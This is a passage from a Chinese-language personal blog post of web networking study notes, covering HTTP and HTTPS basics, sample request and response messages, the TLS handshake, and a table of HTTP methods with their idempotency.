<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#000" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#000">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"tianfei92.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism-okaidia","dark":"prism-okaidia"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false,"highlight_theme":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="一、基础网络协议1.1 HTTP&#x2F;HTTPS协议核心HTTP协议定义 HTTP（HyperText Transfer Protocol）是应用层协议，基于 请求-响应 模型，用于客户端（浏览器）与服务器之间的数据传输，默认端口 80 核心特性  无状态：每个请求独立，服务器不保留客户端上下文（状态管理依赖 Cookie 和 Session） 明文传输：请求与响应内容以未加密的文本形式传输">
<meta property="og:type" content="article">
<meta property="og:title" content="网络知识专题学习">
<meta property="og:url" content="https://tianfei92.github.io/2025/06/20/Network%20Study%20Notes/index.html">
<meta property="og:site_name" content="Ariel&#39;s Blog">
<meta property="og:description" content="一、基础网络协议1.1 HTTP&#x2F;HTTPS协议核心HTTP协议定义 HTTP（HyperText Transfer Protocol）是应用层协议，基于 请求-响应 模型，用于客户端（浏览器）与服务器之间的数据传输，默认端口 80 核心特性  无状态：每个请求独立，服务器不保留客户端上下文（状态管理依赖 Cookie 和 Session） 明文传输：请求与响应内容以未加密的文本形式传输">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-06-20T07:50:13.000Z">
<meta property="article:modified_time" content="2025-07-10T00:42:12.639Z">
<meta property="article:author" content="Ariel">
<meta property="article:tag" content="Network">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://tianfei92.github.io/2025/06/20/Network%20Study%20Notes/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://tianfei92.github.io/2025/06/20/Network%20Study%20Notes/","path":"2025/06/20/Network Study Notes/","title":"网络知识专题学习"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>网络知识专题学习 | Ariel's Blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
  <script src="/js/third-party/tags/mermaid.js" defer></script>





  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Ariel's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">我本地没问题啊</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE"><span class="nav-text">一、基础网络协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-HTTP-HTTPS%E5%8D%8F%E8%AE%AE%E6%A0%B8%E5%BF%83"><span class="nav-text">1.1 HTTP&#x2F;HTTPS协议核心</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="nav-text">HTTP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS%E5%8D%8F%E8%AE%AE"><span class="nav-text">HTTPS协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%EF%BC%88GET-POST-PUT-DELETE%EF%BC%89%E4%B8%8E%E7%8A%B6%E6%80%81%E7%A0%81%EF%BC%88200-301-404-500%EF%BC%89"><span class="nav-text">HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84%EF%BC%88%E8%AF%B7%E6%B1%82%E8%A1%8C%E3%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%E3%80%81%E8%AF%B7%E6%B1%82%E4%BD%93%EF%BC%89"><span class="nav-text">HTTP报文结构（请求行、请求头、请求体）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82-%E5%93%8D%E5%BA%94%E5%A4%B4%E7%BB%93%E6%9E%84%EF%BC%88Content-Type-Cache-Control-Authorization%EF%BC%89"><span class="nav-text">请求&#x2F;响应头结构（Content-Type&#x2F;Cache-Control&#x2F;Authorization）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%EF%BC%88SSL-TLS%E6%8F%A1%E6%89%8B%E3%80%81%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81%EF%BC%89"><span class="nav-text">HTTPS加密原理（SSL&#x2F;TLS握手、证书验证）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-TCP-UDP%E5%9F%BA%E7%A1%80"><span class="nav-text">1.2 TCP&#x2F;UDP基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E6%B5%81%E7%A8%8B"><span class="nav-text">三次握手与四次挥手流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8%EF%BC%88Keep-Alive%EF%BC%89%E4%B8%8E%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E%E9%97%AE%E9%A2%98"><span class="nav-text">连接复用（Keep-Alive）与队头阻塞问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-DNS%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="nav-text">1.3 DNS解析机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%EF%BC%88%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2-%E6%9D%83%E5%A8%81%E8%A7%A3%E6%9E%90%EF%BC%89"><span class="nav-text">域名解析流程（递归查询&#x2F;权威解析）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS%E9%A2%84%E5%8F%96%EF%BC%88dns-prefetch%EF%BC%89%E4%B8%8E%E7%BC%93%E5%AD%98%E4%BC%98%E5%8C%96"><span class="nav-text">DNS预取（dns-prefetch）与缓存优化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%8A%80%E6%9C%AF"><span class="nav-text">二、网络请求技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86"><span class="nav-text">2.1 请求处理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AJAX%E5%8E%9F%E7%90%86%E4%B8%8EXMLHttpRequest%E5%AF%B9%E8%B1%A1"><span class="nav-text">AJAX原理与XMLHttpRequest对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fetch-API%E5%8F%8A%E4%B8%8EXHR%E5%AF%B9%E6%AF%94"><span class="nav-text">Fetch API及与XHR对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%A8%E5%9F%9F%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%88CORS%E6%9C%BA%E5%88%B6-JSONP-%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89"><span class="nav-text">跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1"><span class="nav-text">2.2 实时通信</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WebSocket%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%8F%8C%E5%90%91%E9%80%9A%E4%BF%A1-%E5%BF%83%E8%B7%B3%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="nav-text">WebSocket协议（双向通信&#x2F;心跳检测）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-Sent-Events%EF%BC%88SSE%EF%BC%89%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">Server-Sent Events（SSE）应用场景</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="nav-text">三、网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="nav-text">3.1 攻击防护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%89%E4%B8%8E%E9%98%B2%E5%BE%A1%EF%BC%88%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81-CSP%EF%BC%89"><span class="nav-text">XSS（跨站脚本）与防御（内容编码&#x2F;CSP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89%E4%B8%8EToken%E9%AA%8C%E8%AF%81"><span class="nav-text">CSRF（跨站请求伪造）与Token验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS%E6%B7%B7%E5%90%88%E5%86%85%E5%AE%B9%E9%A3%8E%E9%99%A9%E4%B8%8EHSTS%E7%AD%96%E7%95%A5"><span class="nav-text">HTTPS混合内容风险与HSTS策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5"><span class="nav-text">3.2 安全实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7%EF%BC%88Secure-HttpOnly-SameSite%EF%BC%89"><span class="nav-text">Cookie 安全属性（Secure&#x2F;HttpOnly&#x2F;SameSite）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OAuth-2-0%E6%8E%88%E6%9D%83%E6%B5%81%E7%A8%8B"><span class="nav-text">OAuth 2.0授权流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96"><span class="nav-text">四、性能优化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5"><span class="nav-text">4.1 缓存策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%BC%93%E5%AD%98%EF%BC%88Cache-Control-Expires%EF%BC%89%E4%B8%8E%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%EF%BC%88ETag-Last-Modified%EF%BC%89"><span class="nav-text">强缓存（Cache-Control&#x2F;Expires）与协商缓存（ETag&#x2F;Last-Modified）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Service-Worker%E7%A6%BB%E7%BA%BF%E7%BC%93%E5%AD%98"><span class="nav-text">Service Worker离线缓存</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-%E8%B5%84%E6%BA%90%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96"><span class="nav-text">4.2 资源加载优化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CDN%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%93%E5%AD%98%E9%85%8D%E7%BD%AE%EF%BC%88%E8%BE%B9%E7%BC%98%E8%8A%82%E7%82%B9-%E5%9B%9E%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%89"><span class="nav-text">CDN原理与缓存配置（边缘节点&#x2F;回源策略）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%BA%90%E5%8E%8B%E7%BC%A9%EF%BC%88Gzip-Brotli%EF%BC%89%E4%B8%8EHTTP-2%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8"><span class="nav-text">资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%EF%BC%88preload%EF%BC%89%E4%B8%8E%E9%A2%84%E8%BF%9E%E6%8E%A5%EF%BC%88preconnect%EF%BC%89"><span class="nav-text">预加载（preload）与预连接（preconnect）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-%E5%8D%8F%E8%AE%AE%E5%8D%87%E7%BA%A7"><span class="nav-text">4.3 协议升级</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8E%A8%E9%80%81%EF%BC%88Server-Push%EF%BC%89"><span class="nav-text">HTTP&#x2F;2服务端推送（Server Push）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-3%E7%9A%84QUIC%E5%8D%8F%E8%AE%AE%E4%BC%98%E5%8A%BF"><span class="nav-text">HTTP&#x2F;3的QUIC协议优势</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF"><span class="nav-text">五、高级网络技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-API%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83"><span class="nav-text">5.1 API设计规范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RESTful%E6%9E%B6%E6%9E%84%E5%8E%9F%E5%88%99%EF%BC%88%E8%B5%84%E6%BA%90%E5%8C%96-%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB%EF%BC%89"><span class="nav-text">RESTful架构原则（资源化&#x2F;状态转移）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GraphQL%E6%9F%A5%E8%AF%A2%E4%B8%8EREST%E5%AF%B9%E6%AF%94"><span class="nav-text">GraphQL查询与REST对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-%E8%B0%83%E8%AF%95%E4%B8%8E%E7%9B%91%E6%8E%A7"><span class="nav-text">5.2 调试与监控</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8Network%E9%9D%A2%E6%9D%BF%E5%88%86%E6%9E%90%EF%BC%88Waterfall-Timing%EF%BC%89"><span class="nav-text">浏览器Network面板分析（Waterfall&#x2F;Timing）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%EF%BC%88TTFB-LCP-FCP%EF%BC%89%E7%9B%91%E6%8E%A7"><span class="nav-text">性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-%E6%96%B0%E5%85%B4%E6%8A%80%E6%9C%AF"><span class="nav-text">5.3 新兴技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WebRTC%E5%9F%BA%E7%A1%80%EF%BC%88P2P%E9%80%9A%E4%BF%A1-%E4%BF%A1%E4%BB%A4%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="nav-text">WebRTC基础（P2P通信&#x2F;信令服务）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebTransport%E5%8D%8F%E8%AE%AE%E6%8E%A2%E7%B4%A2"><span class="nav-text">WebTransport协议探索</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ariel"
      src="/uploads/avatar.JPG">
  <p class="site-author-name" itemprop="name">Ariel</p>
  <div class="site-description" itemprop="description">神游在初见的午后</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/tianfei92" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;tianfei92" rel="noopener me" target="_blank">GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:tian.fi@outlook.com" title="E-Mail → mailto:tian.fi@outlook.com" rel="noopener me" target="_blank">E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://juejin.cn/user/3913917124325127" title="Juejin → https:&#x2F;&#x2F;juejin.cn&#x2F;user&#x2F;3913917124325127" rel="noopener me" target="_blank">Juejin</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianfei92.github.io/2025/06/20/Network%20Study%20Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.JPG">
      <meta itemprop="name" content="Ariel">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ariel's Blog">
      <meta itemprop="description" content="神游在初见的午后">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="网络知识专题学习 | Ariel's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          网络知识专题学习
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-06-20 15:50:13" itemprop="dateCreated datePublished" datetime="2025-06-20T15:50:13+08:00">2025-06-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-07-10 08:42:12" itemprop="dateModified" datetime="2025-07-10T08:42:12+08:00">2025-07-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network/" itemprop="url" rel="index"><span itemprop="name">Network</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>52 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="一、基础网络协议"><a href="#一、基础网络协议" class="headerlink" title="一、基础网络协议"></a>一、基础网络协议</h1><h2 id="1-1-HTTP-HTTPS协议核心"><a href="#1-1-HTTP-HTTPS协议核心" class="headerlink" title="1.1 HTTP&#x2F;HTTPS协议核心"></a>1.1 HTTP&#x2F;HTTPS协议核心</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>定义</strong></p>
<p>HTTP（HyperText Transfer Protocol）是应用层协议，基于 请求-响应 模型，用于客户端（浏览器）与服务器之间的数据传输，默认端口 80</p>
<p><strong>核心特性</strong></p>
<ul>
<li>无状态：每个请求独立，服务器不保留客户端上下文（状态管理依赖 Cookie 和 Session）</li>
<li>明文传输：请求与响应内容以未加密的文本形式传输</li>
<li>常用方法：<ul>
<li>GET：获取资源</li>
<li>POST：提交数据</li>
<li>PUT：更新资源</li>
<li>DELETE：删除资源</li>
</ul>
</li>
</ul>
<span id="more"></span>

<p><strong>报文结构</strong></p>
<p>请求报文：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>响应报文：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 200 OK
Content-Type: text/html
&lt;html>...&lt;/html><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h3><p><strong>定义</strong></p>
<p>HTTPS（HTTP secure）&#x3D; HTTP + TSL&#x2F;SSL 加密层，在传输层对 HTTP 数据进行加密，默认端口 443</p>
<p><strong>核心机制</strong></p>
<p>加密原理：</p>
<ul>
<li>非对称加密：使用公钥&#x2F;私钥对协商会话密钥（如 RSA 算法）</li>
<li>对称加密：后续通信使用协商的会话密钥高效加密数据（如 AES 算法）</li>
</ul>
<p>身份验证：依赖数字证书（由 CA 颁发）验证服务器身份，防止中间人攻击</p>
<p><strong>工作流程</strong></p>
<ol>
<li>客户端发起 HTTPS 请求（clienthello）</li>
<li>服务器返回数字证书（含公钥）</li>
<li>客户端验证证书有效性（CA 链、有效期等）</li>
<li>客户端生成会话密钥，用公钥加密后发送给服务器</li>
<li>双方使用会话密钥进行对称加密通信</li>
</ol>
<p><strong>核心优势</strong></p>
<ul>
<li>数据保密：加密传输，防窃听</li>
<li>数据完整：防篡改（MAC 校验）</li>
<li>身份认证：验证服务器真实性</li>
</ul>
<h3 id="HTTP请求方法（GET-POST-PUT-DELETE）与状态码（200-301-404-500）"><a href="#HTTP请求方法（GET-POST-PUT-DELETE）与状态码（200-301-404-500）" class="headerlink" title="HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）"></a>HTTP请求方法（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）与状态码（200&#x2F;301&#x2F;404&#x2F;500）</h3><p><strong>HTTP 请求方法</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">核心特性</th>
<th align="left">典型应用场景</th>
<th align="left">幂等性</th>
<th align="left">安全性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">从服务器获取资源，参数通过URL传递（长度受限）</td>
<td align="left">加载页面、查询数据</td>
<td align="left">是</td>
<td align="left">是</td>
</tr>
<tr>
<td align="left">POST</td>
<td align="left">向服务器提交数据（请求体承载数据），可能修改服务器状态</td>
<td align="left">表单提交、文件上传、登录操作</td>
<td align="left">否</td>
<td align="left">否</td>
</tr>
<tr>
<td align="left">PUT</td>
<td align="left">完整更新服务器资源（需提交完整新数据）</td>
<td align="left">更新用户资料、替换整个文档</td>
<td align="left">是</td>
<td align="left">否</td>
</tr>
<tr>
<td align="left">DELETE</td>
<td align="left">删除服务器指定资源</td>
<td align="left">删除文章、移除用户账户</td>
<td align="left">是</td>
<td align="left">否</td>
</tr>
</tbody></table>
<ul>
<li>幂等性：多次相同请求效果 &#x3D; 一次请求（GET&#x2F;PUT&#x2F;DELETE 是，POST 不是）</li>
